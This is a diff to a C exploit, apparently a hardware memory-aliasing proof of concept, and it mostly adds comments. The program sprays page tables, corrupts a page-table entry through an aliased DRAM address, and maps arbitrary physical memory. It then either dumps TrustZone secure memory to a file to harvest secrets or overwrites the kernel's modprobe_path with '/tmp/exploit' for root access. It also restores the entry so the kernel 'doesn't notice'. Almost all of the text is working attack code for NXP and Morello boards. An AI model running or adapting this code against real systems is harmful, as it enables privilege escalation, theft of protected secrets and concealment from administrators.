@@ -13,18 +13,30 @@
 #include <sys/wait.h>
 #include <sys/mman.h>
 
+/* Spraying parameters. Increasing these increases the number of
+   sprayed page tables.*/
 #define FILE_SIZE (96 * 0x100000)
-#define WRITE_COUNT 1000
 #define SHM_COUNT 0x10000 - 2 /* 2 ^ 16 */
+
 #define PAGE_SIZE sysconf(_SC_PAGESIZE)
+
+/* Hugepage map control. */
 #define HUGEMAP_SIZE    0x40000000
 #define MAP_HUGE_2MB    (21 << MAP_HUGE_SHIFT)
 #define MAP_HUGE_1GB    (30 << MAP_HUGE_SHIFT)
+
+/* Where to dump secure memory contents for TZ attack. */
 #define DUMP_FILE "memory.dmp"
+
+/* Parameters for Linux attack. */
 #define MODPROBE_PATH "/sbin/modprobe"
 #define MODPROBE_PATH_LEN 14
 #define NEW_MODPROBE_PATH "/tmp/exploit"
 #define NEW_MODPROBE_PATH_LEN 12
+
+/* Uncomment to attack TZ instead of Linux. */
+/* #define ATTACK_TZ */
+
 size_t page_size;
 
 const uint64_t magic = 0xF0CACC1AF0CACC1A;
@@ -117,16 +129,22 @@ uint64_t find_odd(void) {
   return -1;
 }
 
-#define MORELLO_TZDRAM_START 0xff000000
-#define MORELLO_TZDRAM_END  0x101000000
-/* #define DRAM0_ALIAS_OFFSET   0x8380000000 */
+/* Example parameters for attack against Morello. */
+/* #define MORELLO_TZDRAM_START 0xff000000 */
+/* #define MORELLO_TZDRAM_END  0x101000000 */
+/* #define MORELLO_DRAM0_ALIAS_OFFSET   0x8380000000 */
+
+/* Parameters for attack against Morello. */
+/* TZ attack parameters. */
 #define NXP_TZDRAM_START 0xfc000000
 #define NXP_TZDRAM_END  0xffc00000
-#define DRAM0_ALIAS_OFFSET 0xB80000000
+/* Linux attack parameters. */
 #define KERNEL_DATA_START 0x83440000
 #define KERNEL_DATA_END 0x8384ffff
+/* Used for both attacks. */
+#define DRAM0_ALIAS_OFFSET 0xB80000000
 
-/* page aligned only, please! */
+/* Constructs a modified PTE. page aligned only, please! */
 uint64_t construct_pte(uint64_t original, uint64_t phys_addr) {
   uint64_t blank = original & ~0xFFFFFFFFF000;
   printf ("0x%zx 0x%zx\n", blank, blank | phys_addr);
@@ -162,6 +180,7 @@ void dump_hex(const void* data, size_t size) {
 	}
 }
 
+/* Perform a large number of reads to evict entries from the TLB. */
 void bust_tlb(void) {
   for (size_t i = 0; i < 500; i++) {
     for (uint64_t* p = maps[i]; (void*)p < (void*)((char*)maps[i] + FILE_SIZE); p += (page_size / sizeof(uint64_t))) {
@@ -179,6 +198,7 @@ int main(int argc, char *argv[]) {
   }
 #endif
   page_size = PAGE_SIZE;
+  /* prepare hugepage mapping. */
   printf("preparing large map (size 0x%zx)\n", HUGEMAP_SIZE);
   map = mmap(NULL, HUGEMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | MAP_HUGE_1GB ,-1, 0);
   if ((long)map == -1) {
@@ -199,6 +219,7 @@ int main(int argc, char *argv[]) {
   }
 #endif
 
+  /* spray page tables, then find memory clobbering */
   spray_tables();
   uint64_t* victim = (uint64_t*)find_odd();
   if ((int64_t)victim == -1) {
@@ -206,9 +227,11 @@ int main(int argc, char *argv[]) {
     return 1;
   }
 
+  /* modify discovered PTE in aliased memory. */
   uint64_t old_victim = *victim;
   *victim = construct_pte(old_victim, NXP_TZDRAM_START + DRAM0_ALIAS_OFFSET);
 
+  /* discover our "window" into pmem - this is the page that the modified PTE maps. */
   uint64_t* window = NULL;
 
   for (size_t i = 0; i < SHM_COUNT; i++) {
@@ -226,6 +249,7 @@ int main(int argc, char *argv[]) {
   printf("window: %p *window: 0x%zx\n", window, *window);
 
 #ifdef ATTACK_TZ
+  /* for TZ, just dump out memory and we can find secrets later. */
   printf("dumping to file...\n");
   for (unsigned char* tar = (unsigned char*)(NXP_TZDRAM_START + DRAM0_ALIAS_OFFSET); (void*)tar < (void*)(NXP_TZDRAM_END + DRAM0_ALIAS_OFFSET); tar += page_size) {
     *victim = construct_pte(old_victim, (uint64_t)tar);
@@ -233,6 +257,7 @@ int main(int argc, char *argv[]) {
     fwrite(window, page_size, 1, dump_fp);
   }
 #else
+  /* for Linux, patch modprobe_path for later exploitation */
   printf("patching kernel...\n");
   for (unsigned char* tar = (unsigned char*)(KERNEL_DATA_START); (void*)tar < (void*)(KERNEL_DATA_END); tar += page_size) {
     *victim = construct_pte(old_victim, (uint64_t)tar);
@@ -251,6 +276,7 @@ int main(int argc, char *argv[]) {
  end:
 #endif
 
+  /* clean up, so Linux doesn't notice anything amiss. */
   *victim = old_victim;
 
 #ifdef ATTACK_TZ
